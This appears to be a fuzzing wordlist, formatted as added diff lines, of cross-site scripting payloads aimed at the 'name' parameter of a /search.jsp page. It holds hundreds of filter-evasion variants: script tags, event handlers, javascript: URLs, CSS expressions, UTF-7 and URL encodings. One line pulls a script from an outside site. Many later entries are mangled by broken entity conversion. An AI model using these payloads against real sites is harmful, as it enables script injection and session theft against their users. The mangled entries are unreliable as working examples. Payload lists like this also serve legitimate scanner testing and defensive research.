+/search.jsp?name=<IMG LOWSRC="javascript:alert(1914)">
+/search.jsp?name=<STYLE>li {list-style-image: url("javascript:alert(1915)");}</STYLE><UL><LI>XSS</br>
+/search.jsp?name=<BODY ONLOAD=alert(1918)>
+/search.jsp?name=<BGSOUND SRC="javascript:alert(1919);">
+/search.jsp?name=<BR SIZE="&{alert(1920)}">
+/search.jsp?name=<LINK REL="stylesheet" HREF="javascript:alert(1921);">
+/search.jsp?name=<STYLE>@im\port'\ja\vasc\ript:alert(1926)';</STYLE>
+/search.jsp?name=<IMG STYLE="xss:expr/*XSS*/ession(alert(1927))">
+/search.jsp?name=exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert(1928))'>
+/search.jsp?name=<STYLE TYPE="text/javascript">alert(1929);</STYLE>
+/search.jsp?name=<STYLE>.XSS{background-image:url("javascript:alert(1930)");}</STYLE><A CLASS=XSS></A>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:alert(1931)")}</STYLE>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:alert(1932)")}</STYLE>
+/search.jsp?name=<XSS STYLE="xss:expression(alert(1933))">
+/search.jsp?name=¼script¾alert(1935)¼/script¾
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1936);">
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1938);">
+/search.jsp?name=<IFRAME SRC="javascript:alert(1939);"></IFRAME>
+/search.jsp?name=<IFRAME SRC=# onmouseover="alert(1940)"></IFRAME>
+/search.jsp?name=<FRAMESET><FRAME SRC="javascript:alert(1941);"></FRAMESET>
+/search.jsp?name=<TABLE BACKGROUND="javascript:alert(1942)">
+/search.jsp?name=<TABLE><TD BACKGROUND="javascript:alert(1943)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:alert(1944))">
+/search.jsp?name=<DIV STYLE="background-image: url(&#1;javascript:alert(1946))">
+/search.jsp?name=<DIV STYLE="width: expression(alert(1947));">
+/search.jsp?name=<BASE HREF="javascript:alert(1948);//">
+/search.jsp?name=<? echo('<SCR)';echo('IPT>alert(1953)</SCRIPT>'); ?>
+/search.jsp?name=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1956)</SCRIPT>">
+/search.jsp?name= <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1957);+ADw-/SCRIPT+AD4-
+/search.jsp?name=<img src=``&NewLine; onerror=alert(1977)&NewLine;
+/search.jsp?name=<script /**/>/**/alert(1981)/**/</script /**/
+/search.jsp?name=<iframe/src="data:text/html,<svg &#198319831983;&#198319830;load=alert(1983)>">
+/search.jsp?name=<meta content="&NewLine; 1984 &NewLine;; JAVASCRIPT&colon; alert(1984)" http-equiv="refresh"/>
+/search.jsp?name=<form><iframe &#09;&#19920;&#19921992; src="javascript&#58;alert(1992)"&#19921992;&#19920;&#09;;>
+/search.jsp?name=http://www.google<script .com>alert(1994)</script
+/search.jsp?name=<script ^__^>alert(1998))</script ^__^
+/search.jsp?name=</style &#32;><script &#32; :-(>/**/alert(1999)/**/</script &#32; :-(
+/search.jsp?name=&#00;</form><input type&#62000;"date" onfocus="alert(2000)">
+/search.jsp?name=<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(2004)&NewLine;>X</a>
+/search.jsp?name=<script ~~~>alert(2005)</script ~~~>
+/search.jsp?name=<iframe// src=javaSCRIPT&colon;alert(2013)
+/search.jsp?name=<%<!--'%><script>alert(2030);</script -->
+/search.jsp?name=<script src="data:text/javascript,alert(2031)"></script>
+/search.jsp?name=<iframe/onreadystatechange=alert(2033)
+/search.jsp?name=<svg/onload=alert(2034)
+/search.jsp?name=<input type="text" value=`` <div/onmouseover='alert(2036)'>X</div>
+/search.jsp?name=<img src=`xx:xx`onerror=alert(2038)>
+/search.jsp?name=<meta http-equiv="refresh" content="0;javascript&colon;alert(2040)"/>
+/search.jsp?name=<script>+-+-2050-+-+alert(2050)</script>
+/search.jsp?name=<body/onload=&lt;!--&gt;&#20510alert(2051)>
+/search.jsp?name=<script itworksinallbrowsers>/*<script* */alert(2052)</script
+/search.jsp?name=<img src ?itworksonchrome?\/onerror = alert(2053)
+/search.jsp?name=<svg><script onlypossibleinopera:-)> alert(2055)
+/search.jsp?name=<script x> alert(2057) </script 2057=2
+/search.jsp?name=<div/onmouseover='alert(2058)'> style="x:">
+/search.jsp?name=<--`<img/src=` onerror=alert(2059)> --!>
+/search.jsp?name=<div style="position:absolute;top:0;left:0;width:206100%;height:206100%" onmouseover="prompt(2061)" onclick="alert(2061)">x</button>
+/search.jsp?name=<form><button formaction=javascript&colon;alert(2063)>CLICKME
+/search.jsp?name=<script>alert(2071);</script>
+/search.jsp?name=<script>alert(2072);</script>
+/search.jsp?name=<IMG SRC="javascript:alert(2073);">
+/search.jsp?name=<IMG SRC=javascript:alert(2074)>
+/search.jsp?name=<IMG SRC=javascript:alert(2075)>
+/search.jsp?name=<IMG SRC=javascript:alert(2076)>
+/search.jsp?name=<IMG """><SCRIPT>alert(2077)</SCRIPT>">
+/search.jsp?name=<scr<script>ipt>alert(2078);</scr</script>ipt>
+/search.jsp?name=<script>alert(2079))</script>
+/search.jsp?name=<img src=foo.png onerror=alert(2080) />
+/search.jsp?name=<style>@im\port'\ja\vasc\ript:alert(2081)';</style>
+/search.jsp?name=<? echo('<scr)'; echo('ipt>alert(2082)</script>'); ?>
+/search.jsp?name=<marquee><script>alert(2083)</script></marquee>
+/search.jsp?name=<IMG SRC=\"jav&#x09;ascript:alert(2084);\">
+/search.jsp?name=<IMG SRC=\"jav&#x0A;ascript:alert(2085);\">
+/search.jsp?name=<IMG SRC=\"jav&#x0D;ascript:alert(2086);\">
+/search.jsp?name=<IMG SRC=javascript:alert(2087))>
+/search.jsp?name="><script>alert(2088)</script>
+/search.jsp?name=</title><script>alert(2090)</script>
+/search.jsp?name=</textarea><script>alert(2091)</script>
+/search.jsp?name=<IMG LOWSRC=\"javascript:alert(2092)\">
+/search.jsp?name=<IMG DYNSRC=\"javascript:alert(2093)\">
+/search.jsp?name=<font style='color:expression(alert(2094))'>
+/search.jsp?name=<img src="javascript:alert(2095)">
+/search.jsp?name=<script language="JavaScript">alert(2096)</script>
+/search.jsp?name=<body onunload="javascript:alert(2097);">
+/search.jsp?name=<body onLoad="alert(2098);"
+/search.jsp?name=[color=red' onmouseover="alert(2099)"]mouse over[/color]
+/search.jsp?name="/></a></><img src=2100.gif onerror=alert(2100)>
+/search.jsp?name=window.alert(2101);
+/search.jsp?name=alert(2103));'))">
+/search.jsp?name=<iframe<?php echo chr(11)?> onload=alert(2104)></iframe>
+/search.jsp?name="><script alert(2105))</script>
+/search.jsp?name='">><script>alert(2107)</script>
+/search.jsp?name=<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(2109);\">
+/search.jsp?name=<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert(2110);\">
+/search.jsp?name=<script>2111 2111 = 1; alert(2111)</script>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:alert(2112)")}</STYLE>
+/search.jsp?name=<?='<SCRIPT>alert(2113)</SCRIPT>'?>
+/search.jsp?name=" onfocus=alert(2115) "> <"
+/search.jsp?name=<FRAMESET><FRAME SRC=\"javascript:alert(2116);\"></FRAMESET>
+/search.jsp?name=<STYLE>li {list-style-image: url(\"javascript:alert(2117)\");}</STYLE><UL><LI>XSS
+/search.jsp?name=perl -e 'print \"<SCR\0IPT>alert(2118)</SCR\0IPT>\";' > out
+/search.jsp?name=perl -e 'print \"<IMG SRC=java\0script:alert(2119)>\";' > out
+/search.jsp?name=<br size=\"&{alert(2120)}\">
+/search.jsp?name=<scrscriptipt>alert(2121)</scrscriptipt>
+/search.jsp?name=</br style=a:expression(alert(21222122>
+/search.jsp?name=</script><script>alert(2123)</script>
+/search.jsp?name="><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(2124)>
+/search.jsp?name=[color=red width=expression(alert(2125))][color]
+/search.jsp?name=<BASE HREF="javascript:alert(2126);//">
+/search.jsp?name="></iframe><script>alert(2128)</script>
+/search.jsp?name=<body onLoad="while(true) alert(2129);">
+/search.jsp?name='"></title><script>alert(2130)</script>
+/search.jsp?name=</textarea>'"><script>alert(2131)</script>
+/search.jsp?name='""><script language="JavaScript"> alert(2132);</script>
+/search.jsp?name=</script></script><<<<script><>>>><<<script>alert(2133)</script>
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:alert(2135);">
+/search.jsp?name='></select><script>alert(2136)</script>
+/search.jsp?name=a="get";b="URL";c="javascript:";d="alert(2140);";eval(a+b+c+d);
+/search.jsp?name=='><script>alert(2141)</script>
+/search.jsp?name=<body background=javascript:'"><script>alert(2143)</script>></body>
+/search.jsp?name=">/XaDoS/><script>alert(2144)</script><script src="http://www.site.com/XSS.js"></script>
+/search.jsp?name=">/KinG-InFeT.NeT/><script>alert(2145)</script>
+/search.jsp?name=!--" /><script>alert(2148);</script>
+/search.jsp?name=<script>alert(2149)</script><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name="><script>alert(2150)</script>><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name='"></title><script>alert(2151)</script>><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name=<img """><script>alert(2152)</script><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name=<script>alert(2153)</script><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name="><script>alert(2154)</script>"><script>alert("XSS by \nxss</h1></marquee>
+/search.jsp?name='"></title><script>alert(2155)</script>><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name=<iframe src="javascript:alert(2156);"></iframe><marquee><h1>XSS by xss</h1></marquee>
+/search.jsp?name='><SCRIPT>alert(2157))</SCRIPT><img src="" alt='
+/search.jsp?name="><SCRIPT>alert(2158))</SCRIPT><img src="" alt="
+/search.jsp?name=\'><SCRIPT>alert(2159))</SCRIPT><img src="" alt=\'
+/search.jsp?name='); alert(2162); var x='
+/search.jsp?name=\\'); alert(2163);var x=\'
+/search.jsp?name=//--></SCRIPT><SCRIPT>alert(2164));
+/search.jsp?name=>"><ScRiPt%20%0a%0d>alert(2165)%3B</ScRiPt>
+/search.jsp?name=<SCRIPT> alert(2170); </SCRIPT>
+/search.jsp?name=<BODY ONLOAD=alert(2171)>
+/search.jsp?name=<BODY BACKGROUND="javascript:alert(2172)">
+/search.jsp?name=<IMG SRC="javascript:alert(2173);">
+/search.jsp?name=<IMG DYNSRC="javascript:alert(2174)">
+/search.jsp?name=<IMG LOWSRC="javascript:alert(2175)">
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:alert(2177);">
+/search.jsp?name=<LINK REL="stylesheet" HREF="javascript:alert(2178);">
+/search.jsp?name=<TABLE BACKGROUND="javascript:alert(2179)">
+/search.jsp?name=<TD BACKGROUND="javascript:alert(2180)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:alert(2181))">
+/search.jsp?name=<DIV STYLE="width: expression(alert(2182));">
+/search.jsp?name=&apos;;alert(2185))//\&apos;;alert(2185))//&quot;;alert(2185))//\&quot;;alert(2185))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(2185))&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;SCRIPT&gt;alert(2187)&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;SCRIPT&gt;alert(2189))&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;BASE HREF=&quot;javascript:alert(2190);//&quot;&gt;
+/search.jsp?name=&lt;BGSOUND SRC=&quot;javascript:alert(2191);&quot;&gt;
+/search.jsp?name=&lt;BODY BACKGROUND=&quot;javascript:alert(2192);&quot;&gt;
+/search.jsp?name=&lt;BODY ONLOAD=alert(2193)&gt;
+/search.jsp?name=&lt;DIV STYLE=&quot;background-image: url(javascript:alert(2194))&quot;&gt;
+/search.jsp?name=&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(2195))&quot;&gt;
+/search.jsp?name=&lt;DIV STYLE=&quot;width: expression(alert(2196));&quot;&gt;
+/search.jsp?name=&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(2197);&quot;&gt;&lt;/FRAMESET&gt;
+/search.jsp?name=&lt;IFRAME SRC=&quot;javascript:alert(2198);&quot;&gt;&lt;/IFRAME&gt;
+/search.jsp?name=&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(2199);&quot;&gt;
+/search.jsp?name=&lt;IMG SRC=&quot;javascript:alert(2200);&quot;&gt;
+/search.jsp?name=&lt;IMG SRC=javascript:alert(2201)&gt;
+/search.jsp?name=&lt;IMG DYNSRC=&quot;javascript:alert(2202);&quot;&gt;
+/search.jsp?name=&lt;IMG LOWSRC=&quot;javascript:alert(2203);&quot;&gt;
+/search.jsp?name=&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(2207)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+/search.jsp?name=%BCscript%BEalert(2211)%BC/script%BE
+/search.jsp?name=&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(2212);&quot;&gt;
+/search.jsp?name=&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(2214);&quot;&gt;
+/search.jsp?name=&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(2217)&gt;&lt;/OBJECT&gt;
+/search.jsp?name=a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(2219);&quot;)&quot;;&#10;eval(a+b+c+d);
+/search.jsp?name=&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(2220);&lt;/STYLE&gt;
+/search.jsp?name=&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(2221))&quot;&gt;
+/search.jsp?name=&lt;XSS STYLE=&quot;xss:expression(alert(2222))&quot;&gt;
+/search.jsp?name=&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(2223)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+/search.jsp?name=&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(2224)&quot;)}&lt;/STYLE&gt;
+/search.jsp?name=&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(2225);&quot;&gt;
+/search.jsp?name=&lt;TABLE BACKGROUND=&quot;javascript:alert(2230)&quot;&gt;&lt;/TABLE&gt;
+/search.jsp?name=&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(2231)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+/search.jsp?name=&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(2233);&quot;&gt;]]&gt;
+/search.jsp?name=&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(2234)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+/search.jsp?name=&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(2238)&lt;/SCRIPT&gt;&quot;&gt;
+/search.jsp?name=&lt;BR SIZE=&quot;&amp;{alert(2243)}&quot;&gt;
+/search.jsp?name=&lt;IMG SRC=JaVaScRiPt:alert(2244)&gt;
+/search.jsp?name=&lt;IMG SRC=javascript:alert(2245)&gt;
+/search.jsp?name=&lt;IMG SRC=`javascript:alert(2246)`&gt;
+/search.jsp?name=&lt;IMG SRC=javascript:alert(2247))&gt;
+/search.jsp?name=&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(2252);+ADw-/SCRIPT+AD4-
+/search.jsp?name=\&quot;;alert(2253);//
+/search.jsp?name=&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(2254);&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(2255)&apos;;&lt;/STYLE&gt;
+/search.jsp?name=&lt;IMG SRC=&quot;jav&#x09;ascript:alert(2256);&quot;&gt;
+/search.jsp?name=&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(2257);&quot;&gt;
+/search.jsp?name=&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(2258);&quot;&gt;
+/search.jsp?name=&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(2259);&quot;&gt;
+/search.jsp?name=perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(2261)>&quot;;&apos;&gt; out
+/search.jsp?name=perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(2262)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+/search.jsp?name=&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(2263);&quot;&gt;
+/search.jsp?name=&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(2265)&gt;
+/search.jsp?name=&lt;IMG SRC=&quot;javascript:alert(2268)&quot;
+/search.jsp?name=&lt;&lt;SCRIPT&gt;alert(2270);//&lt;&lt;/SCRIPT&gt;
+/search.jsp?name=&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(2271)&lt;/SCRIPT&gt;&quot;&gt;
+/search.jsp?name=&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(2390)&gt;
+/search.jsp?name=&lt;/script&gt;&lt;script&gt;alert(2391)&lt;/script&gt;
+/search.jsp?name=&lt;/br style=a:expression(alert(23922392&gt;
+/search.jsp?name=&lt;scrscriptipt&gt;alert(2393)&lt;/scrscriptipt&gt;
+/search.jsp?name=&lt;br size=\&quot;&amp;{alert(2394)}\&quot;&gt;
+/search.jsp?name=perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(2395)&gt;\&quot;;&#039; &gt; out
+/search.jsp?name=perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(2396)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+/search.jsp?name=<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(2397))>
+/search.jsp?name=<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(2399))>
+/search.jsp?name=<~/XSS STYLE=xss:expression(alert(2400))>
+/search.jsp?name="><script>alert(2401)</script>
+/search.jsp?name=</XSS/*-*/STYLE=xss:e/**/xpression(alert(2402))>
+/search.jsp?name=XSS/*-*/STYLE=xss:e/**/xpression(alert(2403))>
+/search.jsp?name=XSS STYLE=xss:e/**/xpression(alert(2404))>
+/search.jsp?name=</XSS STYLE=xss:expression(alert(2405))>
+/search.jsp?name=';;alert(2406))//\';;alert(2406))//";;alert(2406))//\";;alert(2406))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(2406))<;/SCRIPT>;
+/search.jsp?name=<;SCRIPT>;alert(2408)<;/SCRIPT>;
+/search.jsp?name=<;SCRIPT>;alert(2410))<;/SCRIPT>;
+/search.jsp?name=<;BASE HREF=";javascript:alert(2411);//";>;
+/search.jsp?name=<;BGSOUND SRC=";javascript:alert(2412);";>;
+/search.jsp?name=<;BODY BACKGROUND=";javascript:alert(2413);";>;
+/search.jsp?name=<;BODY ONLOAD=alert(2414)>;
+/search.jsp?name=<;DIV STYLE=";background-image: url(javascript:alert(2415))";>;
+/search.jsp?name=<;DIV STYLE=";background-image: url(&;#1;javascript:alert(2416))";>;
+/search.jsp?name=<;DIV STYLE=";width: expression(alert(2417));";>;
+/search.jsp?name=<;FRAMESET>;<;FRAME SRC=";javascript:alert(2418);";>;<;/FRAMESET>;
+/search.jsp?name=<;IFRAME SRC=";javascript:alert(2419);";>;<;/IFRAME>;
+/search.jsp?name=<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(2420);";>;
+/search.jsp?name=<;IMG SRC=";javascript:alert(2421);";>;
+/search.jsp?name=<;IMG SRC=javascript:alert(2422)>;
+/search.jsp?name=<;IMG DYNSRC=";javascript:alert(2423);";>;
+/search.jsp?name=<;IMG LOWSRC=";javascript:alert(2424);";>;
+/search.jsp?name=<;STYLE>;li {list-style-image: url(";javascript:alert(2428)";);}<;/STYLE>;<;UL>;<;LI>;XSS
+/search.jsp?name=%BCscript%BEalert(2432)%BC/script%BE
+/search.jsp?name=<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(2433);";>;
+/search.jsp?name=<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(2435);";>;
+/search.jsp?name=<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(2438)>;<;/OBJECT>;
+/search.jsp?name=a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(2440);";)";;&#10;eval(a+b+c+d);
+/search.jsp?name=<;STYLE TYPE=";text/javascript";>;alert(2441);<;/STYLE>;
+/search.jsp?name=<;IMG STYLE=";xss:expr/*XSS*/ession(alert(2442))";>;
+/search.jsp?name=<;XSS STYLE=";xss:expression(alert(2443))";>;
+/search.jsp?name=<;STYLE>;.XSS{background-image:url(";javascript:alert(2444)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
+/search.jsp?name=<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(2445)";)}<;/STYLE>;
+/search.jsp?name=<;LINK REL=";stylesheet"; HREF=";javascript:alert(2446);";>;
+/search.jsp?name=<;TABLE BACKGROUND=";javascript:alert(2451)";>;<;/TABLE>;
+/search.jsp?name=<;TABLE>;<;TD BACKGROUND=";javascript:alert(2452)";>;<;/TD>;<;/TABLE>;
+/search.jsp?name=<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(2454);";>;]]>;
+/search.jsp?name=<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(2455)";>;<;/B>;<;/I>;<;/XML>;
+/search.jsp?name=<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(2459)<;/SCRIPT>;";>;
+/search.jsp?name=<;BR SIZE=";&;{alert(2464)}";>;
+/search.jsp?name=<;IMG SRC=JaVaScRiPt:alert(2465)>;
+/search.jsp?name=<;IMG SRC=javascript:alert(2466)>;
+/search.jsp?name=<;IMG SRC=`javascript:alert(2467)`>;
+/search.jsp?name=<;IMG SRC=javascript:alert(2468))>;
+/search.jsp?name=<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(2473);+ADw-/SCRIPT+AD4-
+/search.jsp?name=\";;alert(2474);//
+/search.jsp?name=<;/TITLE>;<;SCRIPT>;alert(2475);<;/SCRIPT>;
+/search.jsp?name=<;STYLE>;@im\port';\ja\vasc\ript:alert(2476)';;<;/STYLE>;
+/search.jsp?name=<;IMG SRC=";jav&#x09;ascript:alert(2477);";>;
+/search.jsp?name=<;IMG SRC=";jav&;#x09;ascript:alert(2478);";>;
+/search.jsp?name=<;IMG SRC=";jav&;#x0A;ascript:alert(2479);";>;
+/search.jsp?name=<;IMG SRC=";jav&;#x0D;ascript:alert(2480);";>;
+/search.jsp?name=perl -e ';print ";<;IM SRC=java\0script:alert(2482)>";;';>; out
+/search.jsp?name=perl -e ';print ";&;<;SCR\0IPT>;alert(2483)<;/SCR\0IPT>;";;'; >; out
+/search.jsp?name=<;IMG SRC="; &;#14;  javascript:alert(2484);";>;
+/search.jsp?name=<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(2486)>;
+/search.jsp?name=<;IMG SRC=";javascript:alert(2489)";
+/search.jsp?name=<;<;SCRIPT>;alert(2491);//<;<;/SCRIPT>;
+/search.jsp?name=<;IMG ";";";>;<;SCRIPT>;alert(2492)<;/SCRIPT>;";>;
+/search.jsp?name=";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(2611)>;
+/search.jsp?name=<;/script>;<;script>;alert(2612)<;/script>;
+/search.jsp?name=<;/br style=a:expression(alert(26132613>;
+/search.jsp?name=<;scrscriptipt>;alert(2614)<;/scrscriptipt>;
+/search.jsp?name=<;br size=\";&;{alert(2615)}\";>;
+/search.jsp?name=perl -e &#039;print \";<;IMG SRC=java\0script:alert(2616)>;\";;&#039; >; out
+/search.jsp?name=perl -e &#039;print \";<;SCR\0IPT>;alert(2617)<;/SCR\0IPT>;\";;&#039; >; out
+/search.jsp?name=<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(2618))>
+/search.jsp?name=<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(2620))>
+/search.jsp?name=<~/XSS STYLE=xss:expression(alert(2621))>
+/search.jsp?name="><script>alert(2622)</script>
+/search.jsp?name=</XSS/*-*/STYLE=xss:e/**/xpression(alert(2623))>
+/search.jsp?name=XSS/*-*/STYLE=xss:e/**/xpression(alert(2624))>
+/search.jsp?name=XSS STYLE=xss:e/**/xpression(alert(2625))>
+/search.jsp?name=</XSS STYLE=xss:expression(alert(2626))>
+/search.jsp?name=>"><script>alert(2627)</script>&
+/search.jsp?name="><STYLE>@import"javascript:alert(2628)";</STYLE>
+/search.jsp?name=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(2629)>
+/search.jsp?name=>%22%27><img%20src%3d%22javascript:alert(2630)%22>
+/search.jsp?name='%uff1cscript%uff1ealert(2631)%uff1c/script%uff1e'
+/search.jsp?name=<IMG SRC="javascript:alert(2633);">
+/search.jsp?name=<IMG SRC=javascript:alert(2634)>
+/search.jsp?name=<IMG SRC=JaVaScRiPt:alert(2635)>
+/search.jsp?name=<IMG SRC=JaVaScRiPt:alert(2636)>
+/search.jsp?name=<IMG SRC="jav&#x0A;ascript:alert(2640);">
+/search.jsp?name=<IMG SRC="jav&#x0D;ascript:alert(2641);">
+/search.jsp?name=<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(2643);<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+/search.jsp?name=<script>alert(2649)</script>
+/search.jsp?name=%3cscript%3ealert(2650)%3c/script%3e
+/search.jsp?name=%22%3e%3cscript%3ealert(2651)%3c/script%3e
+/search.jsp?name=<IMG SRC="javascript:alert(2652);">
+/search.jsp?name=<IMG SRC=javascript:alert(2653)>
+/search.jsp?name=<IMG SRC=javascript:alert(2654)>
+/search.jsp?name=<img src=xss onerror=alert(2655)>
+/search.jsp?name=<IMG """><SCRIPT>alert(2656)</SCRIPT>">
+/search.jsp?name=<IMG SRC=javascript:alert(2657))>
+/search.jsp?name=<IMG SRC="jav ascript:alert(2658);">
+/search.jsp?name=<IMG SRC="jav&#x09;ascript:alert(2659);">
+/search.jsp?name=<BODY BACKGROUND="javascript:alert(2663)">
+/search.jsp?name=<BODY ONLOAD=alert(2664)>
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:alert(2665);">
+/search.jsp?name=<IMG SRC="javascript:alert(2666)"
+/search.jsp?name=<<SCRIPT>alert(2668);//<</SCRIPT>
+/search.jsp?name=%253cscript%253ealert(2669)%253c/script%253e
+/search.jsp?name="><s"%2b"cript>alert(2670)</script>
+/search.jsp?name=foo<script>alert(2671)</script>
+/search.jsp?name=<scr<script>ipt>alert(2672)</scr</script>ipt>
+/search.jsp?name=';alert(2674))//\';alert(2674))//";alert(2674))//\";alert(2674))//--></SCRIPT>">'><SCRIPT>alert(2674))</SCRIPT>
+/search.jsp?name=<marquee onstart='javascript:alert(2675);'>=(◕_◕)=
+/search.jsp?name=</span></span><svg onload="alert(2676)//“ #"="">
